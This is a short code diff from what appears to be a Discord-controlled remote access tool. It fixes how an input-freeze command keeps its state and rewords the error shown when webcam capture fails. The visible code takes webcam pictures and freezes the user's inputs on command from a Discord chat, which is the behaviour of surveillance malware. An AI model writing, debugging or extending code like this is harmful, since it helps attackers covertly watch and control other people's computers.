@@ -75,6 +75,7 @@ if ERROR:
 login = os.getlogin()
 client = discord.Client(intents=discord.Intents.all())
 session_id = os.urandom(8).hex()
+freezed = False
 #original_dir = os.getcwd()
 
     
@@ -524,7 +525,7 @@ async def on_message(message):
             image.save(path)
             cap.release()
         except:
-            await message.reply("Failed to take webcam image!")
+            await message.reply("No webcams found!")
             return
         webcam = discord.File(path)
         embed = discord.Embed(title="Webcam", color=0xfafafa)
@@ -557,8 +558,7 @@ async def on_message(message):
     
     elif message.content.startswith("freeze "):
         action = message.content[7:]
-        freezed = False
-
+        
         if action == "1":
             if freezed:
                 await message.reply("Inputs are already freezed!")
